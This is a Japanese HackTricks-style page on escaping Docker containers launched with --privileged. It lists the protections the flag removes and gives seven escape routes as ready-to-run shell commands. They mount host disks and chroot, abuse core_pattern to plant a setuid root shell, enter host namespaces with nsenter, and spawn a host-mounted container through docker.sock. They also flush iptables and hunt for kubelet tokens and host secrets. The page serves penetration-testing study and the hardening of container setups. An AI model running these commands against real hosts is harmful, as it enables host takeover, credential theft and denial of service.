# `--privileged` コンテナからの Escape

{{#include ../../../banners/hacktricks-training.md}}

## 概要

`--privileged` で起動されたコンテナは、追加の権限を1つか2つ持つ通常のコンテナとは異なります。実際には、`--privileged` は、通常であればワークロードを危険なホストリソースから隔離しているデフォルトの runtime 保護機能を複数削除または弱体化します。正確な効果は runtime とホストに依存しますが、Docker では通常、次のようになります。

- すべての capabilities が付与される
- device cgroup の制限が解除される
- 多くの kernel filesystem が read-only ではなくなる
- デフォルトで mask された procfs のパスがなくなる
- seccomp filtering が無効化される
- AppArmor の confinement が無効化される
- SELinux の isolation が無効化されるか、より広範な label に置き換えられる

重要な点は、privileged コンテナでは通常、巧妙な kernel exploit が**必要ない**ということです。多くの場合、host devices、ホストに接続された kernel filesystems、または runtime interfaces と直接やり取りし、その後 host shell へ pivot できます。

## `--privileged` が自動的には変更しないもの

`--privileged` は、host PID、network、IPC、または UTS namespaces に自動的に参加することは**ありません**。privileged コンテナでも private namespaces を使用できます。つまり、一部の escape chain では、次のような追加条件が必要になります。

- host bind mount
- host PID sharing
- host networking
- 可視状態の host devices
- writable な proc/sys interfaces

これらの条件は、実際の misconfiguration では簡単に満たされることが多いものの、概念的には `--privileged` 自体とは別のものです。

## Escape Paths

### 1. Exposed Devices 経由で Host Disk を Mount する

privileged コンテナでは通常、`/dev` 配下により多くの device nodes が表示されます。host block device が表示されている場合、最も簡単な escape は、それを mount して host filesystem に `chroot` することです。
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
rootパーティションが明らかでない場合は、まずブロックレイアウトを列挙します：
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
実用的な方法として、`chroot` するのではなく書き込み可能なホストマウントに setuid ヘルパーを配置する場合は、すべてのファイルシステムが setuid ビットを尊重するわけではないことに注意してください。ホスト側での簡単な機能確認方法は次のとおりです。
```bash
mount | grep -v "nosuid"
```
これは、`nosuid` ファイルシステム下の書き込み可能なパスが、従来の「setuid shell を配置し、後で実行する」ワークフローではあまり興味深い対象ではなくなるため有用です。

ここで悪用されている、弱体化した保護機能は次のとおりです。

- デバイスへの完全なアクセス
- 広範な capabilities、特に `CAP_SYS_ADMIN`

関連ページ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Host の bind mount をマウントまたは再利用して `chroot` する

Host の root filesystem がすでに container 内にマウントされている場合、または container が privileged であるため必要な mount を作成できる場合、Host shell の取得までに必要なのは、多くの場合 `chroot` だけです:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
ホストの root bind mount が存在しないが、ホストストレージにアクセス可能な場合は、作成する:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
この手法は以下を悪用します:

- 弱い mount 制限
- 完全な capabilities
- MAC confinement の欠如

関連ページ:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. 書き込み可能な `/proc/sys` または `/sys` の悪用

`--privileged` の大きな影響の 1 つは、procfs と sysfs の保護が大幅に弱くなることです。これにより、通常は mask されているか read-only で mount されている、host 側に影響する kernel interface が露出する可能性があります。

典型的な例は `core_pattern` です:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
その他の高価値なパスには、次のものがあります:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
この経路は以下を悪用します:

- masked paths の欠落
- read-only system paths の欠落

関連ページ:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Mount または Namespace-Based Escape に Full Capabilities を使用する

privileged container には、通常のコンテナから削除されている `CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_SYS_MODULE`、`CAP_NET_ADMIN` などの capabilities が付与されます。別の露出した攻撃面が存在すれば、これだけでローカル foothold を host escape に変えられることがよくあります。

簡単な例として、追加のファイルシステムをマウントし、namespace entry を使用します:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
ホストの PID も共有されている場合、手順はさらに短くなります:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
この経路では、以下を悪用します。

- デフォルトの privileged capability set
- オプションの host PID sharing

関連ページ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Runtime Sockets 経由での Escape

privileged container では、host の runtime state や socket が見える状態になることがよくあります。Docker、containerd、または CRI-O の socket に到達できる場合、多くの場合、最も簡単な方法は runtime API を使用して host access のある2つ目の container を起動することです:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd の場合:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
この経路では、以下を悪用します。

- privileged runtime exposure
- runtime 自体を通じて作成された host bind mounts

関連ページ：

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Network Isolation の副作用を除去する

`--privileged` だけでは host network namespace に参加しませんが、コンテナに `--network=host` またはその他の host-network access もある場合、ネットワークスタック全体を変更できるようになります。
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
これは常に直接的なホスト shell になるとは限りませんが、denial of service、traffic interception、または loopback 限定の管理サービスへのアクセスにつながる可能性があります。

関連ページ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. ホストのシークレットと Runtime State の読み取り

クリーンな shell escape がすぐに発生しない場合でも、privileged containers は多くの場合、ホストのシークレット、kubelet の state、runtime メタデータ、隣接するコンテナのファイルシステムを読み取るのに十分なアクセス権を持っています:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
`/var` が host-mounted されているか、runtime directories が見える場合、host shell を取得する前であっても、lateral movement や cloud/Kubernetes credential theft に十分悪用できます。

関連ページ:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## チェック

以下のコマンドの目的は、どの privileged-container escape family が直ちに実行可能かを確認することです。
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
ここで注目すべき点:

- 完全な capability セット、特に `CAP_SYS_ADMIN`
- 書き込み可能な proc/sys の公開
- ホストデバイスが可視
- seccomp と MAC confinement が存在しない
- runtime sockets またはホストの root bind mounts

これらのいずれか1つだけでも post-exploitation には十分な場合があります。複数が同時に存在する場合、通常はコンテナが、あと1〜2個のコマンドでホストを compromise できる状態にあることを意味します。

## 関連ページ

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## 参考資料

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
